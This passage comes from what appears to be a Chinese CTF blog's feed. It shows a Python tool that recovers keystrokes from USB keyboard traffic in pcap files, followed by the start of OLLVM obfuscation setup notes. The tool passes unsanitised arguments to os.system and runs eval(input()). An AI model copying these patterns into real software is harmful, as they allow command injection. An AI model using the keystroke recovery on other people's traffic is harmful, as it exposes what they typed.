keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[+] Found : tshark导出数据失败\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>            </pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token keyword\">elif</span> os<span class=\"token punctuation\">.</span>name <span class=\"token operator\">==</span> <span class=\"token string\">\"posix\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>            <span class=\"token comment\">#sed '/^\\s*$/d' 主要是去掉空行</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>            <span class=\"token keyword\">if</span> filterfield <span class=\"token keyword\">not</span> <span class=\"token keyword\">in</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>                command <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"tshark -r </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>pcapfile<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> -Y </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>filterfield<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> -T fields -e </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>fieldvalue<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> | sed '/^\\s*$/d' > </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>self<span class=\"token punctuation\">.</span>datafile<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>            <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>                command <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"tshark -r </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>pcapfile<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> -T fields -e </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>fieldvalue<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> | sed '/^\\s*$/d' > </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>self<span class=\"token punctuation\">.</span>datafile<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>            </pre></td></tr><tr><td data-num=\"40\"></td><td><pre>            <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>                os<span class=\"token punctuation\">.</span>system<span class=\"token punctuation\">(</span>command<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"tshark执行语句：\"</span> <span class=\"token operator\">+</span> command<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[+] Found : tshark导出数据成功\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>            <span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"tshark执行语句：\"</span> <span class=\"token operator\">+</span> command<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[+] Found : tshark导出数据失败\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token comment\">#筛掉无用数据，改变数据格式</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">formatkbdata</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>        formatfile <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"formatKbdatafile.txt\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"w\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>        <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>datafile<span class=\"token punctuation\">,</span> <span class=\"token string\">\"r\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>            <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>                <span class=\"token comment\"># if len(i.strip(\"\\n\")) == 8:</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>                <span class=\"token comment\">#     Bytes = [i[j:j+2] for j in range(0, len(i.strip(\"\\n\")), 2)]</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>                <span class=\"token comment\">#     data = \":\".join(Bytes)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>                <span class=\"token comment\">#     formatfile.writelines(data+\"\\n\")</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>                <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">16</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>                    Bytes <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">:</span>j<span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>                    data <span class=\"token operator\">=</span> <span class=\"token string\">\":\"</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>Bytes<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>                    formatfile<span class=\"token punctuation\">.</span>writelines<span class=\"token punctuation\">(</span>data<span class=\"token operator\">+</span><span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>        formatfile<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">jiemi</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\n-----开始解密Tshark导出的键盘数据-----\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>        <span class=\"token comment\"># 读取数据 z</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>        <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"formatKbdatafile.txt\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"r\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>            <span class=\"token keyword\">for</span> line <span class=\"token keyword\">in</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>                self<span class=\"token punctuation\">.</span>presses<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>line<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#去掉末尾的 \\n</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>        <span class=\"token comment\"># 开始处理</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>        result <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>        <span class=\"token keyword\">for</span> press <span class=\"token keyword\">in</span> self<span class=\"token punctuation\">.</span>presses<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>            <span class=\"token keyword\">if</span> press <span class=\"token operator\">==</span> <span class=\"token string\">''</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>                <span class=\"token keyword\">continue</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>            <span class=\"token comment\">#thark 版本原因，导出数据格式不同</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token string\">':'</span> <span class=\"token keyword\">in</span> press<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>                Bytes <span class=\"token operator\">=</span> press<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>            <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>                <span class=\"token comment\">#两两分组</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>                Bytes <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>press<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">:</span>i<span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>press<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>Bytes<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>            <span class=\"token keyword\">if</span> Bytes<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string\">\"00\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>                <span class=\"token keyword\">if</span> Bytes<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> <span class=\"token string\">\"00\"</span> <span class=\"token keyword\">and</span> self<span class=\"token punctuation\">.</span>normalKeys<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>Bytes<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>                    result<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>normalKeys<span class=\"token punctuation\">[</span>Bytes<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>                    <span class=\"token comment\"># print(result)</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>            <span class=\"token keyword\">elif</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>Bytes<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0b10</span> <span class=\"token keyword\">or</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>Bytes<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0b100000</span><span class=\"token punctuation\">:</span> <span class=\"token comment\"># shift key is pressed.</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>                <span class=\"token keyword\">if</span> Bytes<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> <span class=\"token string\">\"00\"</span> <span class=\"token keyword\">and</span> self<span class=\"token punctuation\">.</span>normalKeys<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>Bytes<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>                    <span class=\"token comment\"># result.append(self.normalKeys[Bytes[2]])</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>                    result<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>shiftKeys<span class=\"token punctuation\">[</span>Bytes<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>            <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[-] Unknow Key : %s\"</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>Bytes<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[+] USB_Found : %s\"</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>        <span class=\"token comment\"># print(type(result))</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>        flag <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>        <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>            <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>                a <span class=\"token operator\">=</span> result<span class=\"token punctuation\">.</span>index<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;DEL>'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>                <span class=\"token keyword\">del</span> result<span class=\"token punctuation\">[</span>a<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>                <span class=\"token keyword\">del</span> result<span class=\"token punctuation\">[</span>a <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>            <span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>                <span class=\"token keyword\">pass</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>        <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>            <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre>                <span class=\"token keyword\">if</span> result<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string\">\"&lt;CAP>\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>                    flag <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>                    result<span class=\"token punctuation\">.</span>pop<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>                    <span class=\"token keyword\">if</span> flag <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>                        flag <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>                <span class=\"token keyword\">if</span> flag <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>                    result<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> result<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>upper<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>            <span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>                <span class=\"token keyword\">pass</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>        </pre></td></tr><tr><td data-num=\"118\"></td><td><pre>        <span class=\"token comment\"># print ('\\n [+] 键盘数据 output :' + \"\".join (result))</span></pre></td></tr><tr><td data-num=\"119\"></td><td><pre></pre></td></tr><tr><td data-num=\"120\"></td><td><pre>        <span class=\"token comment\"># 删除提取数据文件</span></pre></td></tr><tr><td data-num=\"121\"></td><td><pre>        rm_stat <span class=\"token operator\">=</span> <span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"-----是否删除tshark导出的文件 \\\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>self<span class=\"token punctuation\">.</span>datafile<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\\\", 1 or 0-----\\n\"</span></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"122\"></td><td><pre>        <span class=\"token keyword\">if</span> rm_stat <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"123\"></td><td><pre>            os<span class=\"token punctuation\">.</span>remove<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>datafile<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"124\"></td><td><pre></pre></td></tr><tr><td data-num=\"125\"></td><td><pre></pre></td></tr><tr><td data-num=\"126\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"127\"></td><td><pre></pre></td></tr><tr><td data-num=\"128\"></td><td><pre>    <span class=\"token comment\">#我的 vscode 工作区的原因，需要切换到当前目录</span></pre></td></tr><tr><td data-num=\"129\"></td><td><pre>    pwd <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">.</span>dirname<span class=\"token punctuation\">(</span>__file__<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"130\"></td><td><pre>    os<span class=\"token punctuation\">.</span>chdir<span class=\"token punctuation\">(</span>pwd<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"131\"></td><td><pre></pre></td></tr><tr><td data-num=\"132\"></td><td><pre>    BANNER <span class=\"token operator\">=</span> <span class=\"token triple-quoted-string string\">r\"\"\"                                                                                                                                </span></pre></td></tr><tr><td data-num=\"133\"></td><td><pre>    //   / / //   ) )  //   ) )                                           </pre></td></tr><tr><td data-num=\"134\"></td><td><pre>   //   / / ((        //___/ /   ___      __      ___      ___     / ___  </pre></td></tr><tr><td data-num=\"135\"></td><td><pre>  //   / /    \\\\     / __  (   //   ) ) //  ) ) //   ) ) //   ) ) //\\ \\   </pre></td></tr><tr><td data-num=\"136\"></td><td><pre> //   / /       ) ) //    ) ) //       //      //   / / //       //  \\ \\  </pre></td></tr><tr><td data-num=\"137\"></td><td><pre>((___/ / ((___ / / //____/ / ((____   //      ((___( ( ((____   //    \\ \\ </pre></td></tr><tr><td data-num=\"138\"></td><td><pre></pre></td></tr><tr><td data-num=\"139\"></td><td><pre>                                                                @MAY1AS</pre></td></tr><tr><td data-num=\"140\"></td><td><pre>\"\"\"</pre></td></tr><tr><td data-num=\"141\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>BANNER<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"142\"></td><td><pre></pre></td></tr><tr><td data-num=\"143\"></td><td><pre></pre></td></tr><tr><td data-num=\"144\"></td><td><pre></pre></td></tr><tr><td data-num=\"145\"></td><td><pre>    argobject <span class=\"token operator\">=</span> argparse<span class=\"token punctuation\">.</span>ArgumentParser<span class=\"token punctuation\">(</span>prog<span class=\"token operator\">=</span><span class=\"token string\">\"UsbKbCracker\"</span><span class=\"token punctuation\">,</span> description<span class=\"token operator\">=</span><span class=\"token triple-quoted-string string\">\"\"\"This is a script for decrypt UsbKeyboardData</span></pre></td></tr><tr><td data-num=\"146\"></td><td><pre>    \"\"\"<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"147\"></td><td><pre></pre></td></tr><tr><td data-num=\"148\"></td><td><pre>    argobject<span class=\"token punctuation\">.</span>add_argument<span class=\"token punctuation\">(</span><span class=\"token string\">'-f'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"--pcapfile\"</span><span class=\"token punctuation\">,</span> required<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">help</span><span class=\"token operator\">=</span><span class=\"token string\">\"here is your capturedata file\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"149\"></td><td><pre>    argobject<span class=\"token punctuation\">.</span>add_argument<span class=\"token punctuation\">(</span><span class=\"token string\">'-e'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"--fieldvalue\"</span><span class=\"token punctuation\">,</span> required<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">help</span><span class=\"token operator\">=</span><span class=\"token string\">\"here is your output_format\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"150\"></td><td><pre>    argobject<span class=\"token punctuation\">.</span>add_argument<span class=\"token punctuation\">(</span><span class=\"token string\">'-Y'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"--filterfield\"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">help</span><span class=\"token operator\">=</span><span class=\"token string\">\"here is your filter\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"151\"></td><td><pre></pre></td></tr><tr><td data-num=\"152\"></td><td><pre>    arg <span class=\"token operator\">=</span> argobject<span class=\"token punctuation\">.</span>parse_args<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"153\"></td><td><pre></pre></td></tr><tr><td data-num=\"154\"></td><td><pre>    kbparser <span class=\"token operator\">=</span> kbpaser<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"155\"></td><td><pre></pre></td></tr><tr><td data-num=\"156\"></td><td><pre>     <span class=\"token comment\"># tshark 导出数据，存储在 usbdatafile.txt 内</span></pre></td></tr><tr><td data-num=\"157\"></td><td><pre>    kbparser<span class=\"token punctuation\">.</span>tshark_do<span class=\"token punctuation\">(</span>pcapfile<span class=\"token operator\">=</span>arg<span class=\"token punctuation\">.</span>pcapfile<span class=\"token punctuation\">,</span> fieldvalue<span class=\"token operator\">=</span>arg<span class=\"token punctuation\">.</span>fieldvalue<span class=\"token punctuation\">,</span> filterfield<span class=\"token operator\">=</span>arg<span class=\"token punctuation\">.</span>filterfield<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"158\"></td><td><pre>    kbparser<span class=\"token punctuation\">.</span>formatkbdata<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"159\"></td><td><pre>    kbparser<span class=\"token punctuation\">.</span>jiemi<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>得到键盘输入后解 base85</p>\n<link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>",
            "tags": [
                "笔记"
            ]
        },
        {
            "id": "https://3cly.github.io/2023/07/15/ollvm%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/",
            "url": "https://3cly.github.io/2023/07/15/ollvm%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/",
            "title": "ollvm环境配置",
            "date_published": "2023-07-15T15:16:59.000Z",
            "content_html": "<h1 id=\"ollvm环境配置\"><a class=\"markdownIt-Anchor\" href=\"#ollvm环境配置\">#</a> ollvm 环境配置</h1>\n<h2 id=\"介绍\"><a class=\"markdownIt-Anchor\" href=\"#介绍\">#</a> 介绍</h2>\n<p>Ubuntu 虚拟机 22.04</p>\n<p>OLLVM 介绍看这个<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnF1YXJrc2xhYi5jb20vZGVvYmZ1c2NhdGlvbi1yZWNvdmVyaW5nLWFuLW9sbHZtLXByb3RlY3RlZC1wcm9ncmFtLmh0bWw=\"> Deobfuscation: recovering an OLLVM-protected program</span></p>\n<p>Ollvm 混淆主要分成三种模式，这三种模式主要是流程平坦化，指令替换，以及控制流伪造。</p>\n<p><strong>流程平坦化</strong> ：这个模式主要通过将 if-else 语句替换成 do-while 语句，然后通过 switch 语句来对流程的控制，这样就能模糊基本块之间的前后关系。</p>\n<p><strong>指令替换</strong> ：这个模式主要通过使用更复杂的指令序列来替换一些标准的二元运算符，从而增加逆向的难度。</p>\n<p><strong>控制流伪造</strong> ：这个模式主要是会在一个简单的运算中外包好几层 if-else 的判断，从而增加逆向的难度。</p>\n<h3 id=\"一些参数\"><a class=\"markdownIt-Anchor\" href=\"#一些参数\">#</a> 一些参数</h3>\n<h4 id=\"控制流扁平化\"><a class=\"markdownIt-Anchor\" href=\"#控制流扁平化\">#</a> <strong>控制流扁平化</strong></h4>\n<p>这个模式主要是把一些 if-else 语句，嵌套成 do-while 语句</p>\n<p>-mllvm -fla：激活控制流扁平化</p>\n<p>-mllvm -split：激活基本块分割。在一起使用时改善展平。</p>\n<p>-mllvm -split_num=3：如果激活了传递，则在每个基本块上应用 3 次。默认值：1</p>\n<h4 id=\"指令替换\"><a class=\"markdownIt-Anchor\" href=\"#指令替换\">#</a> <strong>指令替换</strong></h4>\n<p>这个模式主要用功能上等效但更复杂的指令序列替换标准二元运算符 (+ , – , &amp; , | 和 ^)</p>\n<p>-mllvm -sub：激活指令替换</p>\n<p>-mllvm -sub_loop=3：如果激活了传递，则在函数上应用 3 次。默认值：1</p>\n<h4 id=\"虚假控制流程\"><a class=\"markdownIt-Anchor\" href=\"#虚假控制流程\">#</a> <strong>虚假控制流程</strong></h4>\n<p>这个模式主要嵌套几层判断逻辑，一个简单的运算都会在外面包几层 if-else，所以这个模式加上编译速度会慢很多因为要做几层假的逻辑包裹真正有用的代码。</p>\n<p>-mllvm -bcf：激活虚假控制流程  